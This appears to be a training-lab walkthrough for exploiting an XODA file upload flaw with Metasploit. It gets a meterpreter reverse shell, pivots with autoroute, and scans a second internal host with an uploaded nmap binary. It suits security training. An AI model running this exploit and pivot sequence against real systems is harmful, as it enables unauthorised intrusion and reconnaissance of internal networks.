#### Tasks
There are two target machines. This target machine is vulnerable and can be exploited using the following information. Use this information to retrieve services running on the second target machine.

**Vulnerability Information**
**Vulnerability:** `XODA File Upload Vulnerability`
**Metasploit module:** `exploit/unix/webapp/xoda_file_upload`

#### Objective
Identify the ports open on the second target machine using appropriate Metasploit modules. - Write a bash script to scan the ports of the second target machine. - Upload the nmap static binary to the target machine and identify the services running on the second target machine.

#### Tools
- Metasploit
- Bash
- Terminal
- Nmap

#### Solution
**Nmap Scan**
```bash
nmap -A -p- <target1>
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-09-13 15:39 IST
Nmap scan report for <target1> (<IP1>)
Host is up (0.000057s latency).
Not shown: 65534 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.7 ((Ubuntu))
|_http-title: ==XODA==
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
| http-git: 
|   <IP1>/.git/
|     Git repository found!
|     Repository description: Unnamed repository; edit this file 'description' to name the...
|     Remotes:
|_      https://github.com/fermayo/hello-world-lamp.git
|_http-server-header: Apache/2.4.7 (Ubuntu)
MAC Address: 02:42:C0:89:30:03 (Unknown)
Device type: general purpose
Running: Linux 4.X|5.X
OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5
OS details: Linux 4.15 - 5.8
Network Distance: 1 hop

TRACEROUTE                                                                                                                                                
HOP RTT     ADDRESS                                                                                                                                       
1   0.06 ms <target1> (<IP1>)                                                                                                          
OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .                                                     
Nmap done: 1 IP address (1 host up) scanned in 9.99 seconds 
```

```bash
nmap -sn 192.137.48.3/24                                                                                                                              
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-09-13 15:50 IST                                                                                        
Nmap scan report for 192.137.48.1                                                                                                                         
Host is up (0.000038s latency).                                                                                                                           
MAC Address: 02:42:06:AF:65:6B (Unknown)                                                                                                                  
Nmap scan report for demo1.ine.local (192.137.48.3)                                                                                                       
Host is up (0.000036s latency).                                                                                                                           
MAC Address: 02:42:C0:89:30:03 (Unknown)                                                                                                                  
Nmap scan report for INE (192.137.48.2)                                                                                                                   
Host is up.                                                                                                                                               
Nmap done: 256 IP addresses (3 hosts up) scanned in 1.97 seconds
```

```bash
nmap -A -p- 192.137.48.2                                                                                                                              
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-09-13 15:50 IST                                                                                        
Nmap scan report for INE (192.137.48.2)                                                                                                                   
Host is up (0.000027s latency).                                                                                                                           
Not shown: 65533 closed tcp ports (reset)                                                                                                                 
PORT      STATE SERVICE       VERSION                                                                                                                     
3389/tcp  open  ms-wbt-server xrdp
45654/tcp open  http          Apache Tomcat 9.0.83
|_http-title: Site doesn't have a title (text/html).
Device type: general purpose
Running: Linux 2.6.X
OS CPE: cpe:/o:linux:linux_kernel:2.6.32
OS details: Linux 2.6.32
Network Distance: 0 hops

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 14.13 seconds
```

Visit `http://192.137.48.3/.git/`

#### Msfconsole
```bash
use exploit/unix/webapp/xoda_file_upload
set RHOSTS demo1.ine.local
set TARGETURI /
set LHOST 192.63.4.2
exploit
``` 
- Received a `meterpreter` shell. 
- Now, get a `command shell` by typing `shell` in `meterpreter`.

#### Check the IP address
```bash
ipconfig
```

#### Add the Target on to Metasploit Routing table
```meterpreter
run autoroute -s <Second-Target>
```

Now, background the `meterpreter` session using `ctrl + z` and perform a port scan.

#### Metasploit Port Scan Module
```metasploit
use auxiliary/scanner/portscan/tcp
set rhosts <Second-Target>
set verbose false
exploit
```

#### Check `Static Binaries` available in `/usr/bin`
**Static binary:** It's statically linked and doesn't rely on libraries from the system. It will run even if the target system is minimal, restricted, or missing libraries.

```bash
ls -al /root/static-binaries/nmap
file /root/static-binaries/nmap
```

#### Foreground the Metasploit session and switch to the meterpreter session
```
fg
sessions -i 1
```

#### Upload the Nmap Static Binary and the Port Scanner
```meterpreter
upload /root/static-binaries/nmap /tmp/nmap
upload /root/port-scanner.sh /tmp/port-scanner.sh
```

#### Scan the Second Target
```bash
shell
cd /tmp/
chmod +x ./nmap ./port-scanner.sh
./port-scanner.sh <Second-Target>
```

#### Run the Nmap Binary to scan the Second Target
```bash
./nmap -p- <Second-Target>
```
